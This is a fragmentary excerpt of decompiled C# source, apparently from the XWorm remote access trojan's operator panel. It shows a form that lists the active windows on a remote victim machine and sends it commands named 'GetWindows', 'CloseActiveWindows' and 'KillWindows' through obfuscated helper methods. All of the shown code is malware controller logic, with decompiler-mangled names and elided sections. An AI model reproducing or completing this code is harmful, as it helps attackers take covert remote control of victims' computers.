...
public class ACT : Form
{
	...
	{
		base.Load += ACT_Load;
		base.FormClosing += ACT_FormClosing;
		InitializeComponent();
	...
	private void InitializeComponent()
	{
		...
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.ACT));
		...
		this.ColumnHeader1.Text = "[ ActiveWindows ]";
	...
	public void method_0()
	{
		...
		byte[] array = Module0.smethod_6("GetWindows");
	...
	{
		byte[] array = Module0.smethod_6("CloseActiveWindows");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
	...
	private void ToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		...
		byte[] array = Module0.smethod_6("KillWindows" + GClass19.string_0 + text);
		_Closure_0024__R56_002D4 arg = default(_Closure_0024__R56_002D4);
		_Closure_0024__R56_002D4 CS_0024_003C_003E8__locals0 = new _Closure_0024__R56_002D4(arg);
